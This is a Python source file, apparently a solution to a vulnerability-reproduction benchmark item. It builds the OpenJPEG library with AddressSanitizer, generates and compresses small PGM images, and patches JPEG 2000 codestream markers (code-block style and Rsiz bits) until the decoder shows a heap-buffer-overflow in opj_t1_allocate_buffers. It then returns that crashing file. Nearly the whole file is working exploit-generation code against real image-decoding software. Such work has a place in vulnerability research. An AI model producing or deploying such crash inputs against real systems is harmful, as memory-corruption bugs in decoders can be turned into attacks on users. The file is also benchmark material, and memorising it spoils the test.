import os
import re
import sys
import tarfile
import zipfile
import shutil
import struct
import tempfile
import subprocess
from typing import Optional, Tuple, List


def _run_cmd(args, cwd=None, env=None, timeout=60) -> Tuple[int, bytes, bytes]:
    p = subprocess.run(
        args,
        cwd=cwd,
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
    )
    return p.returncode, p.stdout, p.stderr


def _is_within_directory(directory: str, target: str) -> bool:
    abs_directory = os.path.abspath(directory)
    abs_target = os.path.abspath(target)
    return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not _is_within_directory(path, member_path):
            continue
        tar.extract(member, path=path)


def _safe_extract_zip(zf: zipfile.ZipFile, path: str) -> None:
    for name in zf.namelist():
        if name.endswith("/"):
            continue
        out_path = os.path.join(path, name)
        if not _is_within_directory(path, out_path):
            continue
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with zf.open(name, "r") as rf, open(out_path, "wb") as wf:
            shutil.copyfileobj(rf, wf)


def _maybe_extract_src(src_path: str, dst_dir: str) -> str:
    if os.path.isdir(src_path):
        return os.path.abspath(src_path)

    lower = src_path.lower()
    if lower.endswith(".zip"):
        with zipfile.ZipFile(src_path, "r") as zf:
            _safe_extract_zip(zf, dst_dir)
    else:
        with tarfile.open(src_path, "r:*") as tf:
            _safe_extract_tar(tf, dst_dir)

    entries = [e for e in os.listdir(dst_dir) if e not in (".", "..")]
    if len(entries) == 1:
        root = os.path.join(dst_dir, entries[0])
        if os.path.isdir(root):
            return root
    return dst_dir


def _find_executable(search_dir: str, name: str) -> Optional[str]:
    candidates = []
    for root, _, files in os.walk(search_dir):
        if name in files:
            p = os.path.join(root, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                candidates.append(p)
    if not candidates:
        for root, _, files in os.walk(search_dir):
            for f in files:
                if f == name or f.endswith("/" + name):
                    p = os.path.join(root, f)
                    if os.path.isfile(p) and os.access(p, os.X_OK):
                        candidates.append(p)
    if not candidates:
        return None
    candidates.sort(key=lambda x: (len(x), x))
    return candidates[0]


def _mk_pgm(w: int, h: int, pattern: str = "grad") -> bytes:
    header = f"P5\n{w} {h}\n255\n".encode("ascii")
    if pattern == "zero":
        pixels = bytes([0]) * (w * h)
    elif pattern == "ff":
        pixels = bytes([255]) * (w * h)
    else:
        arr = bytearray(w * h)
        idx = 0
        for y in range(h):
            for x in range(w):
                arr[idx] = (x * 17 + y * 31 + (x ^ y) * 7) & 0xFF
                idx += 1
        pixels = bytes(arr)
    return header + pixels


def _be_u16(b: bytes, off: int) -> int:
    return (b[off] << 8) | b[off + 1]


def _be_u32(b: bytes, off: int) -> int:
    return (b[off] << 24) | (b[off + 1] << 16) | (b[off + 2] << 8) | b[off + 3]


def _patch_j2k_ht(data: bytes, ht_style_bits: int = 0x40, rsiz_or: int = 0x4000) -> bytes:
    b = bytearray(data)
    if len(b) < 2 or not (b[0] == 0xFF and b[1] == 0x4F):
        return data

    csiz = None
    cod_locs: List[int] = []
    coc_locs: List[int] = []
    siz_loc = None

    i = 0
    n = len(b)

    def read_seg_len(pos: int) -> Optional[int]:
        if pos + 4 > n:
            return None
        L = (b[pos + 2] << 8) | b[pos + 3]
        if L < 2:
            return None
        end = pos + 2 + L
        if end > n:
            return None
        return L

    if i + 2 > n:
        return data
    i += 2  # SOC

    while i + 2 <= n:
        if b[i] != 0xFF:
            i += 1
            continue
        marker = (b[i] << 8) | b[i + 1]
        if marker == 0xFF90:  # SOT
            Lsot = read_seg_len(i)
            if Lsot is None:
                break
            seg_start = i + 4
            if seg_start + 8 > n:
                break
            Psot = _be_u32(b, seg_start + 2)
            tile_end = i + Psot if Psot >= (2 + Lsot) else None
            th_i = i + 2 + Lsot
            while th_i + 2 <= n:
                if b[th_i] != 0xFF:
                    th_i += 1
                    continue
                th_marker = (b[th_i] << 8) | b[th_i + 1]
                if th_marker == 0xFF93:  # SOD
                    th_i += 2
                    break
                if th_marker == 0xFF90:
                    break
                L = read_seg_len(th_i)
                if L is None:
                    break
                if th_marker == 0xFF52:
                    cod_locs.append(th_i)
                elif th_marker == 0xFF53:
                    coc_locs.append(th_i)
                th_i += 2 + L
            if tile_end is not None and tile_end > i:
                i = tile_end
                continue
            else:
                break
        elif marker == 0xFFD9:  # EOC
            break
        elif marker == 0xFF4F:  # SOC (unexpected)
            i += 2
            continue
        else:
            L = read_seg_len(i)
            if L is None:
                break
            if marker == 0xFF51:  # SIZ
                siz_loc = i
                if i + 2 + L >= i + 4 + 2 + 4 * 8 + 2:
                    csiz_off = i + 4 + 2 + 4 * 8
                    if csiz_off + 2 <= n:
                        csiz = _be_u16(b, csiz_off)
            elif marker == 0xFF52:  # COD
                cod_locs.append(i)
            elif marker == 0xFF53:  # COC
                coc_locs.append(i)
            i += 2 + L

    if siz_loc is not None:
        L = _be_u16(b, siz_loc + 2)
        if siz_loc + 2 + L <= n and siz_loc + 6 <= n:
            rsiz = _be_u16(b, siz_loc + 4)
            rsiz |= (rsiz_or & 0xFFFF)
            b[siz_loc + 4] = (rsiz >> 8) & 0xFF
            b[siz_loc + 5] = rsiz & 0xFF

    for pos in cod_locs:
        if pos + 12 > n:
            continue
        L = _be_u16(b, pos + 2)
        end = pos + 2 + L
        if end > n or L < 10:
            continue
        base = pos + 4
        cblksty_off = base + 8
        if cblksty_off < end:
            b[cblksty_off] |= (ht_style_bits & 0xFF)

    if csiz is None:
        csiz = 1
    comp_len = 1 if csiz <= 256 else 2

    for pos in coc_locs:
        if pos + 12 > n:
            continue
        L = _be_u16(b, pos + 2)
        end = pos + 2 + L
        if end > n or L < (2 + comp_len + 6):
            continue
        base = pos + 4
        cblksty_off = base + comp_len + 4
        if cblksty_off < end:
            b[cblksty_off] |= (ht_style_bits & 0xFF)

    return bytes(b)


def _looks_like_j2k(data: bytes) -> bool:
    return len(data) >= 2 and data[0] == 0xFF and data[1] == 0x4F


def _read_small_candidate_from_archive(src_path: str) -> Optional[bytes]:
    exts = (".j2k", ".jp2", ".jph", ".jpx")
    best = None
    best_score = None

    def consider(name: str, content: bytes):
        nonlocal best, best_score
        if not content or len(content) < 64:
            return
        low = name.lower()
        if not low.endswith(exts):
            return
        score = abs(len(content) - 1479)
        if best is None or score < best_score:
            best = content
            best_score = score

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for f in files:
                low = f.lower()
                if low.endswith(exts):
                    p = os.path.join(root, f)
                    try:
                        if os.path.getsize(p) <= 200000:
                            with open(p, "rb") as rf:
                                consider(f, rf.read())
                    except Exception:
                        pass
        return best

    lower = src_path.lower()
    try:
        if lower.endswith(".zip"):
            with zipfile.ZipFile(src_path, "r") as zf:
                for zi in zf.infolist():
                    if zi.file_size <= 200000 and zi.filename.lower().endswith(exts):
                        with zf.open(zi, "r") as rf:
                            consider(zi.filename, rf.read())
        else:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if m.isfile() and m.size <= 200000 and m.name.lower().endswith(exts):
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        consider(m.name, f.read())
    except Exception:
        return None

    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        candidate = _read_small_candidate_from_archive(src_path)
        if candidate and _looks_like_j2k(candidate):
            mutated = _patch_j2k_ht(candidate, ht_style_bits=0x40, rsiz_or=0x4000)
            return mutated

        with tempfile.TemporaryDirectory(prefix="arvo47500_") as tmp:
            src_extract = os.path.join(tmp, "src")
            os.makedirs(src_extract, exist_ok=True)
            src_dir = _maybe_extract_src(src_path, src_extract)

            build_dir = os.path.join(tmp, "build")
            os.makedirs(build_dir, exist_ok=True)

            env = os.environ.copy()
            asan_cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
            env["CFLAGS"] = asan_cflags + (" " + env["CFLAGS"] if "CFLAGS" in env else "")
            env["CXXFLAGS"] = asan_cflags + (" " + env["CXXFLAGS"] if "CXXFLAGS" in env else "")
            env["LDFLAGS"] = "-fsanitize=address" + (" " + env["LDFLAGS"] if "LDFLAGS" in env else "")

            cmake_args = [
                "cmake",
                src_dir,
                "-DBUILD_SHARED_LIBS=OFF",
                "-DBUILD_TESTING=OFF",
                "-DBUILD_DOC=OFF",
                "-DBUILD_CODEC=ON",
            ]
            rc, _, _ = _run_cmd(cmake_args, cwd=build_dir, env=env, timeout=180)
            if rc != 0:
                if candidate:
                    return _patch_j2k_ht(candidate, ht_style_bits=0x40, rsiz_or=0x4000)
                return b"\x00"

            rc, _, _ = _run_cmd(["cmake", "--build", ".", "-j", "8"], cwd=build_dir, env=env, timeout=300)
            if rc != 0:
                if candidate:
                    return _patch_j2k_ht(candidate, ht_style_bits=0x40, rsiz_or=0x4000)
                return b"\x00"

            opj_compress = _find_executable(build_dir, "opj_compress")
            opj_decompress = _find_executable(build_dir, "opj_decompress")
            if not opj_compress or not opj_decompress:
                for base in (src_dir, build_dir):
                    opj_compress = opj_compress or _find_executable(base, "opj_compress")
                    opj_decompress = opj_decompress or _find_executable(base, "opj_decompress")
                if not opj_compress or not opj_decompress:
                    if candidate:
                        return _patch_j2k_ht(candidate, ht_style_bits=0x40, rsiz_or=0x4000)
                    return b"\x00"

            run_env = os.environ.copy()
            run_env["ASAN_OPTIONS"] = "detect_leaks=0:abort_on_error=1:symbolize=0"
            run_env["UBSAN_OPTIONS"] = "abort_on_error=1:symbolize=0"

            def try_one(pgm_w: int, pgm_h: int, pattern: str, extra_args: List[str], ht_style_bits: int, rsiz_or: int) -> Optional[bytes]:
                pgm_path = os.path.join(tmp, f"in_{pgm_w}x{pgm_h}_{pattern}.pgm")
                j2k_path = os.path.join(tmp, f"out_{pgm_w}x{pgm_h}_{pattern}.j2k")
                out_img = os.path.join(tmp, f"dec_{pgm_w}x{pgm_h}_{pattern}.pgm")
                with open(pgm_path, "wb") as wf:
                    wf.write(_mk_pgm(pgm_w, pgm_h, pattern=pattern))
                if os.path.exists(j2k_path):
                    try:
                        os.unlink(j2k_path)
                    except Exception:
                        pass
                args = [opj_compress, "-i", pgm_path, "-o", j2k_path] + extra_args
                rc, _, _ = _run_cmd(args, cwd=tmp, env=run_env, timeout=60)
                if rc != 0 or not os.path.exists(j2k_path):
                    return None
                with open(j2k_path, "rb") as rf:
                    data = rf.read()
                if not _looks_like_j2k(data):
                    return None
                mutated = _patch_j2k_ht(data, ht_style_bits=ht_style_bits, rsiz_or=rsiz_or)
                mut_path = os.path.join(tmp, f"mut_{pgm_w}x{pgm_h}_{pattern}_{ht_style_bits:02x}_{rsiz_or:04x}.j2k")
                with open(mut_path, "wb") as wf:
                    wf.write(mutated)
                if os.path.exists(out_img):
                    try:
                        os.unlink(out_img)
                    except Exception:
                        pass
                rc, _, err = _run_cmd([opj_decompress, "-i", mut_path, "-o", out_img], cwd=tmp, env=run_env, timeout=60)
                err_l = err.decode("latin1", errors="ignore")
                if ("AddressSanitizer" in err_l or "heap-buffer-overflow" in err_l) and ("t1_allocate_buffers" in err_l or "opj_t1_allocate_buffers" in err_l):
                    return mutated
                return None

            extra_arg_sets = [
                [],
                ["-n", "1"],
                ["-n", "1", "-r", "20"],
                ["-n", "1", "-q", "100"],
            ]

            sizes = [1, 2, 4, 8, 16, 32, 64]
            patterns = ["grad", "zero"]
            ht_variants = [
                (0x40, 0x0000),
                (0x40, 0x4000),
                (0xC0, 0x4000),
                (0xC0, 0x0000),
            ]

            for w in sizes:
                for pattern in patterns:
                    for extra in extra_arg_sets:
                        for ht_style_bits, rsiz_or in ht_variants:
                            res = try_one(w, w, pattern, extra, ht_style_bits, rsiz_or)
                            if res is not None:
                                return res

            if candidate and _looks_like_j2k(candidate):
                return _patch_j2k_ht(candidate, ht_style_bits=0xC0, rsiz_or=0x4000)

            minimal = _mk_pgm(1, 1, pattern="zero")
            return minimal